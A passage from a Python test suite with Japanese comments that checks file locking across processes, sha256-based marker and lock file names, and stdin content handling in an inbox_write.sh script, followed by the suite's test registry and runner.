                [sys.executable, "-c", child_script],
                capture_output=True, text=True, timeout=10,
            )
            assert proc.returncode == 0, \
                f"child must exit 0, got rc={proc.returncode} stderr={proc.stderr}"
            assert os.path.exists(signal_file), "child must write signal file"
            with open(signal_file) as f:
                result = f.read()
            assert result == "blocked", \
                f"child must be blocked while parent holds lock, got {result!r}"
        finally:
            release_correlation_lock(fd)

        # parent release 後は別 process が獲得可能
        signal_file2 = os.path.join(tmp, "child_signal2.txt")
        scripts_dir = os.path.dirname(HERE)
        child_script2 = (
            "import os, sys\n"
            f"sys.path.insert(0, {scripts_dir!r})\n"
            "from fukuincho_report_poke_bundle import acquire_correlation_lock, release_correlation_lock\n"
            f"fd = acquire_correlation_lock('xp-corr-real', lock_dir={tmp!r}, timeout_sec=1.0)\n"
            f"open({signal_file2!r}, 'w').write('blocked' if fd is None else 'acquired')\n"
            "release_correlation_lock(fd)\n"
        )
        proc2 = subprocess.run(
            [sys.executable, "-c", child_script2],
            capture_output=True, text=True, timeout=10,
        )
        assert proc2.returncode == 0, \
            f"second child must exit 0, got rc={proc2.returncode} stderr={proc2.stderr}"
        with open(signal_file2) as f:
            result2 = f.read()
        assert result2 == "acquired", \
            f"second child must acquire after parent release, got {result2!r}"
    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 16. ★cycle2 fix5 (B2)★: marker path full hash (truncate collision 排除) verify
# ════════════════════════════════════════════════════════════

def test_marker_and_lock_paths_use_full_sha256_hash():
    """★B2 cure verify★: marker/lock basename は sha256(corr_id) hex (truncation なし)"""
    cid = "some-correlation-id.with.dots_and-dashes"
    expected_hash = hashlib.sha256(cid.encode("utf-8")).hexdigest()
    assert _corr_id_hash(cid) == expected_hash
    mp = _marker_path("/tmp/dummy", cid)
    lp = _lock_path("/tmp/dummy", cid)
    assert mp.endswith(f"{expected_hash}.poked"), f"got {mp}"
    assert lp.endswith(f"{expected_hash}.lock"), f"got {lp}"


def test_marker_distinct_corr_ids_no_collision_even_long_shared_prefix():
    """★B2 cure verify★: 共通 prefix 200 字超の 2 corr_id は別 marker basename を持つ
    (旧版は truncate(200) で誤 collision、新版は hash で完全 distinct)"""
    prefix = "x" * 250
    cid_a = prefix + "_AAA"
    cid_b = prefix + "_BBB"
    assert _marker_path("/tmp/d", cid_a) != _marker_path("/tmp/d", cid_b), \
        "long shared prefix corr_ids must produce distinct marker paths (B2 cure)"
    assert _lock_path("/tmp/d", cid_a) != _lock_path("/tmp/d", cid_b), \
        "long shared prefix corr_ids must produce distinct lock paths (B2 cure)"


# ════════════════════════════════════════════════════════════
# 17. ★cycle2 fix5 (S2)★: inbox_write.sh real stdin path verify (process inspection cure)
# ════════════════════════════════════════════════════════════

def test_inbox_write_sh_stdin_path_real_subprocess():
    """★S2 cure verify★: 実 inbox_write.sh script を起動して stdin 経路 content
    受領を実証 (mock 経路でなく実シェル動作)。Self-send guard を利用して
    Supabase / cross-PC bridge を起動させずに validate 段階で reject させ、
    bash の CONTENT 上書きが効いていることだけを観測する。"""
    inbox_write = os.path.join(os.path.dirname(HERE), "inbox_write.sh")
    if not os.path.exists(inbox_write):
        # script 不在 (極稀): 環境前提崩れとして fail
        raise AssertionError(f"inbox_write.sh not found at {inbox_write}")

    env = dict(os.environ)
    env[_INBOX_WRITE_STDIN_ENV] = "1"
    content_payload = "STDIN_DELIVERED_CONTENT_marker_XYZ"
    # Self-send で reject されるが、reject に至る前に CONTENT が空でないこと =
    # bash が stdin から content を取得していること を意味する
    proc = subprocess.run(
        [
            "bash", inbox_write,
            "_self_send_x",
            _INBOX_WRITE_STDIN_PLACEHOLDER,
            "report_received",
            "_self_send_x",  # FROM == TARGET → self-send guard で reject
        ],
        input=content_payload,
        capture_output=True, text=True, timeout=10,
        env=env,
    )
    assert proc.returncode != 0, "self-send must reject (rc!=0)"
    # self-send guard message が出ていれば CONTENT 空 validate を通っている =
    # stdin path が動作している evidence
    assert "self-send detected" in proc.stderr, \
        f"expected self-send rejection (means stdin CONTENT was read), got: {proc.stderr!r}"
    # 「Usage: inbox_write.sh」(空 validate fail) は出てはならない
    assert "Usage: inbox_write.sh" not in proc.stderr, \
        f"empty-content validate triggered — stdin path NOT working: {proc.stderr!r}"


def test_inbox_write_sh_stdin_env_unset_keeps_argv_compat():
    """★S2 cure backward compat verify★: env 未設定なら従来通り $2 を CONTENT として使う
    (既存 caller の argv 経路に影響しない)"""
    inbox_write = os.path.join(os.path.dirname(HERE), "inbox_write.sh")
    env = dict(os.environ)
    env.pop(_INBOX_WRITE_STDIN_ENV, None)
    # argv $2 にダミー content を直接渡し、self-send で reject させる
    proc = subprocess.run(
        [
            "bash", inbox_write,
            "_self_send_y", "argv-content-not-stdin",
            "report_received", "_self_send_y",
        ],
        capture_output=True, text=True, timeout=10,
        env=env,
    )
    assert proc.returncode != 0
    assert "self-send detected" in proc.stderr
    # Usage validate も出ない (=argv content が読まれた)
    assert "Usage: inbox_write.sh" not in proc.stderr


# ════════════════════════════════════════════════════════════
# main
# ════════════════════════════════════════════════════════════

CASES = [
    ("0. constants verbatim (ACK_N_SEC/RETRY_M_MAX/BACKOFF)", test_constants_verbatim),
    # (ii) window title 厳密一致 verify rate
    ("(ii) strict_title accepts canonical desktop app", test_strict_title_accepts_canonical_desktop_app),
    ("(ii) strict_title rejects browsers by process", test_strict_title_rejects_browsers_by_process),
    ("(ii) strict_title rejects non-desktop process", test_strict_title_rejects_non_desktop_process),
    ("(ii) strict_title rejects pattern mismatch", test_strict_title_rejects_pattern_mismatch),
    ("(ii) strict_title rejects V5 guard tokens", test_strict_title_rejects_v5_guard_tokens),
    # (iii) flock + marker file 冪等性
    ("(iii) already_poked starts false", test_already_poked_starts_false),
    ("(iii) mark_poked persists marker", test_mark_poked_persists_marker),
    ("(iii) acquire_lock basic lifecycle", test_acquire_lock_basic_lifecycle),
    ("(iii) acquire_lock creates lock file on disk", test_acquire_lock_blocks_parallel),
    # (i) INSERT runner shape + FKI-NO-DUP
    ("(i) report_insert uses runner (FKI-NO-DUP)", test_report_insert_via_inbox_write_uses_runner),
    ("(i) report_insert failure propagates rc", test_report_insert_failure_propagates_rc),
    # (v) ae8083dd ack リトライ
    ("(v) backoff_seconds sequence (30,60,120)", test_backoff_seconds_sequence),
    ("(v) ack_retry succeeds first attempt", test_poke_with_ack_retry_succeeds_first_attempt),
    ("(v) ack_retry backoff then succeed", test_poke_with_ack_retry_backoff_on_error_then_succeed),
    ("(v) ack_retry exhausts max attempts", test_poke_with_ack_retry_exhausts_max_attempts),
    ("(v) ack_retry human_required terminates", test_poke_with_ack_retry_human_required_terminates_immediately),
    # ALL-SSH-NO-NEW-ENDPOINT-01 順守
    ("(SSH) main_pc direct cmd (no ssh)", test_fire_poke_main_pc_direct_cmd),
    ("(SSH) third_pc uses confirmed endpoint", test_fire_poke_third_pc_uses_ssh_endpoint),
    ("(SSH) unsupported origin returns error", test_fire_poke_unsupported_origin_returns_error),
    # (iv) 障害時安全側
    ("(iv) bundle skips poke when insert fails", test_bundle_skips_poke_when_insert_fails),
    # (iii) bundle level 二重 poke 防止
    ("(iii) bundle skips when already poked", test_bundle_skips_when_already_poked),
    ("(iii) bundle marks poked on fired", test_bundle_marks_poked_on_fired),
    # (i) bundle level latency
    ("(i) bundle records elapsed_sec", test_bundle_records_elapsed_sec),
    # (iv) safety: ★cycle2 RED-B1 cure★ marker IS set after INSERT success even on poke error
    ("(iv,cycle2) bundle marks poked after insert even on poke error",
     test_bundle_marks_poked_after_insert_even_on_poke_error),
    # FKI-NO-DUP evidence
    ("FKI-NO-DUP reuses ae8083dd engine", test_fki_no_dup_reuses_ae8083dd_engine),
    # log sanitize
    ("log_sanitize strips secret keys", test_log_sanitize_strips_secret_keys),
    # ──────────────────────────────────────────────────────────
    # cycle2 fix1 (RED-S1 SSH injection cure)
    # ──────────────────────────────────────────────────────────
    ("cycle2 fix1: validate_correlation_id accepts safe chars",
     test_validate_correlation_id_accepts_safe_chars),
    ("cycle2 fix1: validate_correlation_id rejects shell metas",
     test_validate_correlation_id_rejects_shell_metas),
    ("cycle2 fix1: validate_correlation_id rejects non-string",
     test_validate_correlation_id_rejects_non_string),
    ("cycle2 fix1: fire_poke rejects injection corr_id (SSH path)",
     test_fire_poke_rejects_injection_corr_id_ssh_path),
    ("cycle2 fix1: fire_poke rejects injection corr_id (main_pc path)",
     test_fire_poke_rejects_injection_corr_id_main_pc),
    ("cycle2 fix1: fire_poke SSH uses shlex.quote for corr_id",
     test_fire_poke_ssh_uses_shlex_quote_for_corr_id),
    # ──────────────────────────────────────────────────────────
    # cycle2 fix2 (RED-B1 dup-INSERT rerun cure)
    # ──────────────────────────────────────────────────────────
    ("cycle2 fix2: bundle rerun after poke error skips INSERT (dup-INSERT zero)",
     test_bundle_rerun_after_poke_error_skips_insert_zero_dup),
    # ──────────────────────────────────────────────────────────
    # cycle2 fix3 (RED-G cross-platform cure)
    # ──────────────────────────────────────────────────────────
    ("cycle2 fix3: lock_dir default uses tempfile.gettempdir",
     test_lock_dir_default_uses_tempfile_gettempdir),
    ("cycle2 fix3: bundle module imports on platform (fcntl/msvcrt wrapper)",
     test_bundle_module_imports_on_platform),
    # ──────────────────────────────────────────────────────────
    # cycle2 fix4 (Q1-3 test gap: real cross-process flock)
    # ──────────────────────────────────────────────────────────
    ("cycle2 fix4: acquire_lock real cross-process blocks",
     test_acquire_lock_real_cross_process_blocks),
    # ──────────────────────────────────────────────────────────
    # cycle2 fix5 (B2 full hash + S2 stdin content)
    # ──────────────────────────────────────────────────────────
    ("cycle2 fix5 (B2): marker/lock paths use full sha256 hash",
     test_marker_and_lock_paths_use_full_sha256_hash),
    ("cycle2 fix5 (B2): no truncation collision on long shared prefix",
     test_marker_distinct_corr_ids_no_collision_even_long_shared_prefix),
    ("cycle2 fix5 (S2): inbox_write.sh real stdin path",
     test_inbox_write_sh_stdin_path_real_subprocess),
    ("cycle2 fix5 (S2): inbox_write.sh argv backward compat",
     test_inbox_write_sh_stdin_env_unset_keeps_argv_compat),
]


def main():
    print(f"Running {len(CASES)} tests for fukuincho_report_poke_bundle.py")
    print("=" * 70)
    for name, fn in CASES:
        run(name, fn)
    print("=" * 70)
    print(f"PASS: {_PASS}, FAIL: {_FAIL}, SKIP: 0")
    if _FAIL:
        print("\n--- FAILURE DETAILS ---")
        for detail in _FAIL_DETAILS:
            print(detail)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
